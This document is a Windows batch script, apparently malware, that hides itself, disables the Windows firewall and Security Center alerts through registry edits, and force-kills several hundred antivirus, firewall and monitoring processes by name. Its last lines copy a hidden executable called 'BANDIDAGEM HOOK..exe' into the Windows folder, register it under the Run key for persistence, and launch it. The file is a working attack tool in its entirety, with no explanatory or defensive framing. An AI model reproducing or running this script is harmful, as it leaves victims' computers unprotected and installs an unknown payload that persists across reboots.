@echo off 
break off 
attrib +R +A +S +H killer.bat 
netsh firewall set opmode mode = disable >nul 
net stop SharedAccess >nul 
reg add "HKLM\software\microsoft\security center" /f /v AntiVirusDisableNotify /t REG_DWORD /d 1 >nul 
reg add "HKLM\software\microsoft\security center" /f /v FirewallDisableNotify /t REG_DWORD /d 1 >nul 
taskkill /f /im nod32krn.exe 
cls 
taskkill /f /im nod32.exe 
cls 
taskkill /f /im kavmm.exe 
cls 
taskkill /f /im avgemc.exe 
cls 
taskkill /f /im avgcc.exe 
cls 
taskkill /f /im avgamsvr.exe 
cls 
taskkill /f /im avgupsvc.exe 
cls 
taskkill /f /im avgw.exe 
cls 
taskkill /f /im ashwebsv.exe 
cls 
taskkill /f /im ashdisp.exe 
cls 
taskkill /f /im ashmaisv.exe 
cls 
taskkill /f /im ashserv.exe 
cls 
taskkill /f /im ashwebsv.exe 
cls 
taskkill /f /im aswupdsv.exe 
cls 
taskkill /f /im ewidoctrl.exe 
cls 
taskkill /f /im guard.exe 
cls 
taskkill /f /im gcasdtserv.exe 
cls 
taskkill /f /im msmpeng.exe 
cls 
taskkill /f /im mcafee.exe 
cls 
taskkill /f /im mghml.exe 
cls 
taskkill /f /im msiexec.exe 
cls 
taskkill /f /im outpost.exe 
cls 
taskkill /f /im isafe.exe 
cls 
taskkill /f /im minilog.exe 
cls 
taskkill /f /im zonealarm.exe 
cls 
taskkill /f /im zlclient.exe 
cls 
taskkill /f /im updclient.exe 
cls 
taskkill /f /im ccapp.exe 
cls 
taskkill /f /im navw32.exe 
cls 
taskkill /f /im norton.exe 
cls 
taskkill /f /im navapsvc.exe 
cls 
taskkill /f /im ccsetmgr.exe 
cls 
taskkill /f /im cccproxy.exe 
cls 
taskkill /f /im ccapp.exe 
cls 
taskkill /f /im ccevtmgr.exe 
cls 
taskkill /f /im npfmntor.exe 
cls 
taskkill /f /im logexprt.exe 
cls 
taskkill /f /im nisum.exe 
cls 
taskkill /f /im issvc.exe 
cls 
taskkill /f /im cpdclnt.exe 
cls 
taskkill /f /im pavprsrv.exe 
cls 
taskkill /f /im pavprot.exe 
cls 
taskkill /f /im avengine.exe 
cls 
taskkill /f /im apvxdwin.exe 
cls 
taskkill /f /im webproxy.exe 
cls 
taskkill /f /im avguard.exe 
cls 
taskkill /f /im avgnt.exe 
cls 
taskkill /f /im shed.exe 
cls 
taskkill /f /im avsched32.exe 
cls 
taskkill /f /im sccomm.exe 
cls 
taskkill /f /im spiderml.exe 
cls 
taskkill /f /im sgmain.exe 
cls 
taskkill /f /im spywareguard.exe 
cls 
taskkill /f /im kpf4gui.exe 
cls 
taskkill /f /im kpf4ss.exe 
cls 
taskkill /f /im mcdash.exe 
cls 
taskkill /f /im mcdetect.exe 
cls 
taskkill /f /im mcregwiz.exe 
cls 
taskkill /f /im mcinfo.exe 
cls 
taskkill /f /im mghtml.exe 
cls 
taskkill /f /im oasclnt.exe 
cls 
taskkill /f /im mpfagent.exe 
cls 
taskkill /f /im mpfconsole.exe 
cls 
taskkill /f /im mpfservice.exe 
cls 
taskkill /f /im mpftray.exe 
cls 
taskkill /f /im mpfwizard.exe 
cls 
taskkill /f /im mvtx.exe 
cls 
taskkill /f /im _avp32.exe 
cls 
taskkill /f /im _avpcc.exe 
cls 
taskkill /f /im _avpm.exe 
cls 
taskkill /f /im ackwin32.exe 
cls 
taskkill /f /im advxdwin.exe 
cls 
taskkill /f /im agentsvr.exe 
cls 
taskkill /f /im agv.exe 
cls 
taskkill /f /im ahnsd.exe 
cls 
taskkill /f /im alertsvc.exe 
cls 
taskkill /f /im alogserv.exe 
cls 
taskkill /f /im amon.exe 
cls 
taskkill /f /im amon9x.exe 
cls 
taskkill /f /im amonavp32.exe 
cls 
taskkill /f /im anti -trojan.exe 
cls 
taskkill /f /im antivir.exe 
cls 
taskkill /f /im antivirus.exe 
cls 
taskkill /f /im ants.exe 
cls 
taskkill /f /im antssircam.exe 
cls 
taskkill /f /im apimonitor.exe 
cls 
taskkill /f /im aplica32.exe 
cls 
taskkill /f /im apvxdwin.exe 
cls 
taskkill /f /im atcon.exe 
cls 
taskkill /f /im atguard.exe 
cls 
taskkill /f /im ats.exe 
cls 
taskkill /f /im atscan.exe 
cls 
taskkill /f /im atupdater.exe 
cls 
taskkill /f /im atwatch.exe 
cls 
taskkill /f /im autodown.exe 
cls 
taskkill /f /im autotrace.exe 
cls 
taskkill /f /im autoupdate.exe 
cls 
taskkill /f /im avconsol.exe 
cls 
taskkill /f /im ave32.exe 
cls 
taskkill /f /im avgcc32.exe 
cls 
taskkill /f /im avgctrl.exe 
cls 
taskkill /f /im avgserv.exe 
cls 
taskkill /f /im avgserv9.exe 
cls 
taskkill /f /im avgserv9schedapp.exe 
cls 
taskkill /f /im avgw.exe 
cls 
taskkill /f /im avkpop.exe 
cls 
taskkill /f /im avkserv.exe 
cls 
taskkill /f /im avkservice.exe 
cls 
taskkill /f /im avkwcl9.exe 
cls 
taskkill /f /im avkwctl9.exe 
cls 
taskkill /f /im avnt.exe 
cls 
taskkill /f /im avp.exe 
cls 
taskkill /f /im avp32.exe 
cls 
taskkill /f /im avpcc.exe 
cls 
taskkill /f /im AVPCC Service.exe 
cls 
taskkill /f /im avpccavpm.exe 
cls 
taskkill /f /im avpdos32.exe 
cls 
taskkill /f /im avpexec.exe 
cls 
taskkill /f /im avpinst.exe 
cls 
taskkill /f /im avpm.exe 
cls 
taskkill /f /im avpmonitor.exe 
cls 
taskkill /f /im avptc.exe 
cls 
taskkill /f /im avptc32.exe 
cls 
taskkill /f /im avpupd.exe 
cls 
taskkill /f /im avpupdates.exe 
cls 
taskkill /f /im avrescue.exe 
cls 
taskkill /f /im avsched32.exe 
cls 
taskkill /f /im avsynmgr.exe 
cls 
taskkill /f /im avwin95.exe 
cls 
taskkill /f /im avwinnt.exe 
cls 
taskkill /f /im avwupd32.exe 
cls 
taskkill /f /im avxgui.exe 
cls 
taskkill /f /im avxinit.exe 
cls 
taskkill /f /im avxlive.exe 
cls 
taskkill /f /im avxmonitor9x.exe 
cls 
taskkill /f /im avxmonitornt.exe 
cls 
taskkill /f /im avxnews.exe 
cls 
taskkill /f /im avxquar.exe 
cls 
taskkill /f /im avxsch.exe 
cls 
taskkill /f /im avxw.exe 
cls 
taskkill /f /im BACKLOG.exe 
cls 
taskkill /f /im bd_professional.exe 
cls 
taskkill /f /im bidef.exe 
cls 
taskkill /f /im bidserver.exe 
cls 
taskkill /f /im bipcp.exe 
cls 
taskkill /f /im bisp.exe 
cls 
taskkill /f /im blackd.exe 
cls 
taskkill /f /im blackice.exe 
cls 
taskkill /f /im blackiceblackd.exe 
cls 
taskkill /f /im BootWarn.exe 
cls 
taskkill /f /im borg2.exe 
cls 
taskkill /f /im bs120.exe 
cls 
taskkill /f /im bullguard.exe 
cls 
taskkill /f /im ccApp.exe 
cls 
taskkill /f /im ccevtmgr.exe 
cls 
taskkill /f /im ccIMScan.exe 
cls 
taskkill /f /im ccPwdSrc.exe 
cls 
taskkill /f /im ccpxysvc.exe 
cls 
taskkill /f /im ccSetMgr.exe 
cls 
taskkill /f /im cdp.exe 
cls 
taskkill /f /im cfiadmin.exe 
cls 
taskkill /f /im cfiaudit.exe 
cls 
taskkill /f /im cfinet.exe 
cls 
taskkill /f /im cfinet32.exe 
cls 
taskkill /f /im claw95.exe 
cls 
taskkill /f /im claw95cf.exe 
cls 
taskkill /f /im clean.exe 
cls 
taskkill /f /im cleaner.exe 
cls 
taskkill /f /im cleaner3.exe 
cls 
taskkill /f /im cleanpc.exe 
cls 
taskkill /f /im cmgrdian.exe 
cls 
taskkill /f /im cmon016.exe 
cls 
taskkill /f /im codered.exe 
cls 
taskkill /f /im connectionmonitor.exe 
cls 
taskkill /f /im conseal.exe 
cls 
taskkill /f /im cpd.exe 
cls 
taskkill /f /im cpf9x206.exe 
cls 
taskkill /f /im ctrl.exe 
cls 
taskkill /f /im defalert.exe 
cls 
taskkill /f /im defence.exe 
cls 
taskkill /f /im defense.exe 
cls 
taskkill /f /im defscangui.exe 
cls 
taskkill /f /im defwatch.exe 
cls 
taskkill /f /im deputy.exe 
cls 
taskkill /f /im doors.exe 
cls 
taskkill /f /im dpf.exe 
cls 
taskkill /f /im drwatson.exe 
cls 
taskkill /f /im drweb32.exe 
cls 
taskkill /f /im dvp95.exe 
cls 
taskkill /f /im dvp95_0.exe 
cls 
taskkill /f /im ecengine.exe 
cls 
taskkill /f /im edisk.exe 
cls 
taskkill /f /im efpeadm.exe 
cls 
taskkill /f /im esafe.exe 
cls 
taskkill /f /im escanh95.exe 
cls 
taskkill /f /im escanhnt.exe 
cls 
taskkill /f /im escanv95.exe 
cls 
taskkill /f /im espwatch.exe 
cls 
taskkill /f /im etrustcipe.exe 
cls 
taskkill /f /im evpn.exe 
cls 
taskkill /f /im exantivirus -cnet.exe 
cls 
taskkill /f /im fameh32.exe 
cls 
taskkill /f /im fast.exe 
cls 
taskkill /f /im fch32.exe 
cls 
taskkill /f /im fih32.exe 
cls 
taskkill /f /im findviru.exe 
cls 
taskkill /f /im firewall.exe 
cls 
taskkill /f /im fix-it.exe 
cls 
taskkill /f /im flowprotector.exe 
cls 
taskkill /f /im fnrb32.exe 
cls 
taskkill /f /im fp -win.exe 
cls 
taskkill /f /im fp -win_trial.exe 
cls 
taskkill /f /im fprot.exe 
cls 
taskkill /f /im frw.exe 
cls 
taskkill /f /im fsaa.exe 
cls 
taskkill /f /im fsav32.exe 
cls 
taskkill /f /im fsav95.exe 
cls 
taskkill /f /im fsave32.exe 
cls 
taskkill /f /im fsgk32.exe 
cls 
taskkill /f /im fsm32.exe 
cls 
taskkill /f /im fsma32.exe 
cls 
taskkill /f /im fsmb32.exe 
cls 
taskkill /f /im fwenc.exe 
cls 
taskkill /f /im gbmenu.exe 
cls 
taskkill /f /im gbpoll.exe 
cls 
taskkill /f /im gedit.exe 
cls 
taskkill /f /im generics.exe 
cls 
taskkill /f /im grief3878.exe 
cls 
taskkill /f /im guard.exe 
cls 
taskkill /f /im guarddog.exe 
cls 
taskkill /f /im HackerEliminator.exe 
cls 
taskkill /f /im iamapp.exe 
cls 
taskkill /f /im iamserv.exe 
cls 
taskkill /f /im iamstats.exe 
cls 
taskkill /f /im ibmasn.exe 
cls 
taskkill /f /im ibmavsp.exe 
cls 
taskkill /f /im icload95.exe 
cls 
taskkill /f /im icloadnt.exe 
cls 
taskkill /f /im icmon.exe 
cls 
taskkill /f /im icsupp95.exe 
cls 
taskkill /f /im icsuppnt.exe 
cls 
taskkill /f /im iface.exe 
cls 
taskkill /f /im ifw2000.exe 
cls 
taskkill /f /im inoculateit.exe 
cls 
taskkill /f /im iomon98.exe 
cls 
taskkill /f /im iparmor.exe 
cls 
taskkill /f /im iris.exe 
cls 
taskkill /f /im isrv95.exe 
cls 
taskkill /f /im jammer.exe 
cls 
taskkill /f /im jedi.exe 
cls 
taskkill /f /im kavpf.exe 
cls 
taskkill /f /im ldnetmon.exe 
cls 
taskkill /f /im ldpromenu.exe 
cls 
taskkill /f /im ldscan.exe 
cls 
taskkill /f /im localnet.exe 
cls 
taskkill /f /im lockdown.exe 
cls 
taskkill /f /im lookout.exe 
cls 
taskkill /f /im luall.exe 
cls 
taskkill /f /im lucomserver.exe 
cls 
taskkill /f /im luspt.exe 
cls 
taskkill /f /im mcafee.exe 
cls 
taskkill /f /im mcagent.exe 
cls 
taskkill /f /im mcmnhdlr.exe 
cls 
taskkill /f /im mcshield.exe 
cls 
taskkill /f /im mcshieldvvstat.exe 
cls 
taskkill /f /im mctool.exe 
cls 
taskkill /f /im mcupdate.exe 
cls 
taskkill /f /im mcvsrte.exe 
cls 
taskkill /f /im mcvsshld.exe 
cls 
taskkill /f /im mgavrtcl.exe 
cls 
taskkill /f /im mgavrte.exe 
cls 
taskkill /f /im mghtml.exe 
cls 
taskkill /f /im mgui.exe 
cls 
taskkill /f /im minilog.exe 
cls 
taskkill /f /im mon.exe 
cls 
taskkill /f /im monitor.exe 
cls 
taskkill /f /im monsys32.exe 
cls 
taskkill /f /im monsysnt.exe 
cls 
taskkill /f /im moolive.exe 
cls 
taskkill /f /im mpfservice.exe 
cls 
taskkill /f /im mpftray.exe 
cls 
taskkill /f /im mrflux.exe 
cls 
taskkill /f /im msinfo32.exe 
cls 
taskkill /f /im mwatch.exe 
cls 
taskkill /f /im mxtask.exe 
cls 
taskkill /f /im n32scanw.exe 
cls 
taskkill /f /im nav.exe 
cls 
taskkill /f /im NAV DefAlert.exe 
cls 
taskkill /f /im nav32.exe 
cls 
taskkill /f /im navalert.exe 
cls 
taskkill /f /im navap.exe 
cls 
taskkill /f /im navapsvc.exe 
cls 
taskkill /f /im NAVAPW32.exe 
cls 
taskkill /f /im navauto -protect.exe 
cls 
taskkill /f /im navdx.exe 
cls 
taskkill /f /im navengnavex15.exe 
cls 
taskkill /f /im navlu32.exe 
cls 
taskkill /f /im navnt.exe 
cls 
taskkill /f /im navrunr.exe 
cls 
taskkill /f /im navstub.exe 
cls 
taskkill /f /im navw32.exe 
cls 
taskkill /f /im Navwnt.exe 
cls 
taskkill /f /im nc2000.exe 
cls 
taskkill /f /im ndd32.exe 
cls 
taskkill /f /im neomonitor.exe 
cls 
taskkill /f /im neowatchlog.exe 
cls 
taskkill /f /im net2000.exe 
cls 
taskkill /f /im netarmor.exe 
cls 
taskkill /f /im netcommando.exe 
cls 
taskkill /f /im netinfo.exe 
cls 
taskkill /f /im netmon.exe 
cls 
taskkill /f /im netpro.exe 
cls 
taskkill /f /im netprotect.exe 
cls 
taskkill /f /im netscanpro.exe 
cls 
taskkill /f /im netspyhunter -1.2.exe 
cls 
taskkill /f /im netstat.exe 
cls 
taskkill /f /im netutils.exe 
cls 
taskkill /f /im netutils].exe 
cls 
taskkill /f /im nimda.exe 
cls 
taskkill /f /im nisserv.exe 
cls 
taskkill /f /im nisum.exe 
cls 
taskkill /f /im nisumnisservnisum.exe 
cls 
taskkill /f /im nmain.exe 
cls 
taskkill /f /im nod32.exe 
cls 
taskkill /f /im norman.exe 
cls 
taskkill /f /im norman_32.exe 
cls 
taskkill /f /im norman_av.exe 
cls 
taskkill /f /im norman32.exe 
cls 
taskkill /f /im normanav.exe 
cls 
taskkill /f /im normist.exe 
cls 
taskkill /f /im norton.exe 
cls 
taskkill /f /im Norton Auto-Protect.exe 
cls 
taskkill /f /im norton_av.exe 
cls 
taskkill /f /im nortonav.exe 
cls 
taskkill /f /im notstart.exe 
cls 
taskkill /f /im npfmessenger.exe 
cls 
taskkill /f /im npfw.exe 
cls 
taskkill /f /im npfw32.exe 
cls 
taskkill /f /im nprotect.exe 
cls 
taskkill /f /im npscheck.exe 
cls 
taskkill /f /im npssvc.exe 
cls 
taskkill /f /im nresq32.exe 
cls 
taskkill /f /im nsched32.exe 
cls 
taskkill /f /im nschednt.exe 
cls 
taskkill /f /im nsplugin.exe 
cls 
taskkill /f /im ntrtscan.exe 
cls 
taskkill /f /im ntvdm.exe 
cls 
taskkill /f /im ntxconfig.exe 
cls 
taskkill /f /im nui.exe 
cls 
taskkill /f /im nupgrade.exe 
cls 
taskkill /f /im nvarch16.exe 
cls 
taskkill /f /im nvc95.exe 
cls 
taskkill /f /im nvsvc32.exe 
cls 
taskkill /f /im nwservice.exe 
cls 
taskkill /f /im nwtool16.exe 
cls 
taskkill /f /im offguard.exe 
cls 
taskkill /f /im OPScan.exe 
cls 
taskkill /f /im ostronet.exe 
cls 
taskkill /f /im outpost.exe 
cls 
taskkill /f /im padmin.exe 
cls 
taskkill /f /im panda.exe 
cls 
taskkill /f /im pandaav.exe 
cls 
taskkill /f /im panixk.exe 
cls 
taskkill /f /im pav.exe 
cls 
taskkill /f /im pavcl.exe 
cls 
taskkill /f /im pavproxy.exe 
cls 
taskkill /f /im pavsched.exe 
cls 
taskkill /f /im pavw.exe 
cls 
taskkill /f /im pc -cillan.exe 
cls 
taskkill /f /im pc -cillin.exe 
cls 
taskkill /f /im pccclient.exe 
cls 
taskkill /f /im pccguide.exe 
cls 
taskkill /f /im pcciomon.exe 
cls 
taskkill /f /im pccntmon.exe 
cls 
taskkill /f /im pccwin97.exe 
cls 
taskkill /f /im pccwin98.exe 
cls 
taskkill /f /im pcfwallicon.exe 
cls 
taskkill /f /im pcscan.exe 
cls 
taskkill /f /im periscope.exe 
cls 
taskkill /f /im persfw.exe 
cls 
taskkill /f /im pf2.exe 
cls 
taskkill /f /im pfwadmin.exe 
cls 
taskkill /f /im pingscan.exe 
cls 
taskkill /f /im platin.exe 
cls 
taskkill /f /im pop3trap.exe 
cls 
taskkill /f /im poproxy.exe 
cls 
taskkill /f /im portdetective.exe 
cls 
taskkill /f /im portmonitor.exe 
cls 
taskkill /f /im ppinupdt.exe 
cls 
taskkill /f /im pptbc.exe 
cls 
taskkill /f /im ppvstop.exe 
cls 
taskkill /f /im processmonitor.exe 
cls 
taskkill /f /im procexplorerv10#.exe 
cls 
taskkill /f /im programauditor.exe 
cls 
taskkill /f /im proport.exe 
cls 
taskkill /f /im protectx.exe 
cls 
taskkill /f /im pspf.exe 
cls 
taskkill /f /im purge.exe 
cls 
taskkill /f /im pview95.exe 
cls 
taskkill /f /im pw32.exe 
cls 
taskkill /f /im qconsole.exe 
cls 
taskkill /f /im rav.exe 
cls 
taskkill /f /im rav7.exe 
cls 
taskkill /f /im rav7win.exe 
cls 
taskkill /f /im realmon.exe 
cls 
taskkill /f /im regrun2.exe 
cls 
taskkill /f /im rescue.exe 
cls 
taskkill /f /im rrguard.exe 
cls 
taskkill /f /im rshell.exe 
cls 
taskkill /f /im rtvscn95.exe 
cls 
taskkill /f /im rulaunch.exe 
cls 
taskkill /f /im safeweb.exe 
cls 
taskkill /f /im SAVscan.exe 
cls 
taskkill /f /im sbserv.exe 
cls 
taskkill /f /im SBservice.exe 
cls 
taskkill /f /im scan.exe 
cls 
taskkill /f /im scan32.exe 
cls 
taskkill /f /im scan95.exe 
cls 
taskkill /f /im scanpm.exe 
cls 
taskkill /f /im scrscan.exe 
cls 
taskkill /f /im sd.exe 
cls 
taskkill /f /im SENS.exe 
cls 
taskkill /f /im serv95.exe 
cls 
taskkill /f /im sfc.exe 
cls 
taskkill /f /im sh.exe 
cls 
taskkill /f /im sharedaccess.exe 
cls 
taskkill /f /im shn.exe 
cls 
taskkill /f /im smc.exe 
cls 
taskkill /f /im sofi.exe 
cls 
taskkill /f /im sophos.exe 
cls 
taskkill /f /im sophos_av.exe 
cls 
taskkill /f /im sophosav.exe 
cls 
taskkill /f /im spf.exe 
cls 
taskkill /f /im sphinx.exe 
cls 
taskkill /f /im spy.exe 
cls 
taskkill /f /im spygate.exe 
cls 
taskkill /f /im spyx.exe 
cls 
taskkill /f /im spyxx.exe 
cls 
taskkill /f /im srwatch.exe 
cls 
taskkill /f /im ss3edit.exe 
cls 
taskkill /f /im st2.exe 
cls 
taskkill /f /im supftrl.exe 
cls 
taskkill /f /im supp95.exe 
cls 
taskkill /f /im supporter5.exe 
cls 
taskkill /f /im sweep95.exe 
cls 
taskkill /f /im sweepnet.exe 
cls 
taskkill /f /im sweepsrv.sys.exe 
cls 
taskkill /f /im sweepsrv.sysvshwin32.exe 
cls 
taskkill /f /im swnetsup.exe 
cls 
taskkill /f /im symantec.exe 
cls 
taskkill /f /im Symantec Core LC.exe 
cls 
taskkill /f /im symlcsvc.exe 
cls 
taskkill /f /im symproxysvc.exe 
cls 
taskkill /f /im symtray.exe 
cls 
taskkill /f /im sysedit.exe 
cls 
taskkill /f /im taskmon.exe 
cls 
taskkill /f /im taumon.exe 
cls 
taskkill /f /im tauscan.exe 
cls 
taskkill /f /im tbscan.exe 
cls 
taskkill /f /im tcm.exe 
cls 
taskkill /f /im tctca.exe 
cls 
taskkill /f /im tds -3.exe 
cls 
taskkill /f /im tds2 -98.exe 
cls 
taskkill /f /im tds2 -nt.exe 
cls 
taskkill /f /im tfak.exe 
cls 
taskkill /f /im tfak5.exe 
cls 
taskkill /f /im tgbob.exe 
cls 
taskkill /f /im trendmicro.exe 
cls 
taskkill /f /im trjscan.exe 
cls 
taskkill /f /im trojantrap3.exe 
cls 
taskkill /f /im TrueVector.exe 
cls 
taskkill /f /im undoboot.exe 
cls 
taskkill /f /im update.exe 
cls 
taskkill /f /im vbcmserv.exe 
cls 
taskkill /f /im vbcons.exe 
cls 
taskkill /f /im vbust.exe 
cls 
taskkill /f /im vbwin9x.exe 
cls 
taskkill /f /im vbwinntw.exe 
cls 
taskkill /f /im vccmserv.exe 
cls 
taskkill /f /im vcontrol.exe 
cls 
taskkill /f /im vet32.exe 
cls 
taskkill /f /im vet95.exe 
cls 
taskkill /f /im vettray.exe 
cls 
taskkill /f /im vir -help.exe 
cls 
taskkill /f /im virus.exe 
cls 
taskkill /f /im virusmdpersonalfirewall.exe 
cls 
taskkill /f /im vnlan300.exe 
cls 
taskkill /f /im vnpc3000.exe 
cls 
taskkill /f /im vpc32.exe 
cls 
taskkill /f /im vpfw30s.exe 
cls 
taskkill /f /im vptray.exe 
cls 
taskkill /f /im vscan40.exe 
cls 
taskkill /f /im vsched.exe 
cls 
taskkill /f /im vsecomr.exe 
cls 
taskkill /f /im vshwin32.exe 
cls 
taskkill /f /im vshwin32vbcmserv.exe 
cls 
taskkill /f /im vsmain.exe 
cls 
taskkill /f /im vsmon.exe 
cls 
taskkill /f /im vsstat.exe 
cls 
taskkill /f /im vswin9xe.exe 
cls 
taskkill /f /im vswinntse.exe 
cls 
taskkill /f /im w9x.exe 
cls 
taskkill /f /im watchdog.exe 
cls 
taskkill /f /im webscanx.exe 
cls 
taskkill /f /im webtrap.exe 
cls 
taskkill /f /im wfindv32.exe 
cls 
taskkill /f /im wgfe95.exe 
cls 
taskkill /f /im whoswatchingme.exe 
cls 
taskkill /f /im wimmun32.exe 
cls 
taskkill /f /im winrecon.exe 
cls 
taskkill /f /im winroute.exe 
cls 
taskkill /f /im winsfcm.exe 
cls 
taskkill /f /im wnt.exe 
cls 
taskkill /f /im wqkmm3878.exe 
cls 
taskkill /f /im wradmin.exe 
cls 
taskkill /f /im wrctrl.exe 
cls 
taskkill /f /im wsbgate.exe 
cls 
taskkill /f /im wyvernworksfirewall.exe 
cls 
taskkill /f /im zapro.exe 
cls 
taskkill /f /im zatutor.exe 
cls 
taskkill /f /im zauinst.exe 
cls 
taskkill /f /im zonealarm.exe 
cls 
move BANDIDAGEM HOOK..exe c:\windows 
attrib +R +A +S +H "c:\BANDIDAGEM HOOK..exe 
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v kill /t REG_SZ /d c:\windows\BANDIDAGEM HOOK..exe 
cls 
start BANDIDAGEM HOOK..exe 
cls 
exit 